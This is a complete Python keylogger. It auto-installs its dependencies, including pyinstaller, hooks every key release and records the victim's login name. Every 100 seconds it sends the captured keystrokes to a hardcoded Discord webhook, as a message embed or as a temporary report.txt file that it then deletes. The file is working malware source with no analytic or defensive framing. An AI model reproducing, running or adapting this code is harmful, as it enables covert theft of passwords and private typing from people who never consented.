import keyboard,os
import subprocess
from threading import Timer
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed


def check_and_install_module(module_name):
    try:
        __import__(module_name)
        print(f"{module_name} is already installed.")
    except ImportError:
        print(f"{module_name} is not installed. Installing...")
        subprocess.check_call(["pip", "install", module_name])
        print(f"{module_name} has been installed.")

if __name__ == "__main__":
    modules_to_check = ["keyboard", "pyinstaller", "discord_webhook"]

    for module in modules_to_check:
        check_and_install_module(module)


SEND_REPORT_EVERY = 100
WEBHOOK = "https://discord.com/api/webhooks/971587489515065354/BIW03h4Zbj_8ByraR3Z4JrJEV2Y1UA9kJFxJt6sc8JzREXGesJD4abX5Xd8FBPi6MEAh"

class Keylogger: 
    def __init__(self, interval, report_method="webhook"):
        now = datetime.now()
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = now.strftime('%d/%m/%Y %H:%M')
        self.end_dt = now.strftime('%d/%m/%Y %H:%M')
        self.username = os.getlogin()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def report_to_webhook(self):
        flag = False
        webhook = DiscordWebhook(url=WEBHOOK)
        if len(self.log) > 2000:
            flag = True
            path = os.environ["temp"] + "\\report.txt"
            with open(path, 'w+') as file:
                file.write(f"Keylogger Report From {self.username} Time: {self.end_dt}\n\n")
                file.write(self.log)
            with open(path, 'rb') as f:
                webhook.add_file(file=f.read(), filename='report.txt')
        else:
            embed = DiscordEmbed(title=f" Report From ({self.username}) Time: {self.end_dt}", description=self.log)
            webhook.add_embed(embed)    
        webhook.execute()
        if flag:
            os.remove(path)

    def report(self):
        if self.log:
            if self.report_method == "webhook":
                self.report_to_webhook()    
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()
    
if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="webhook")    
    keylogger.start()
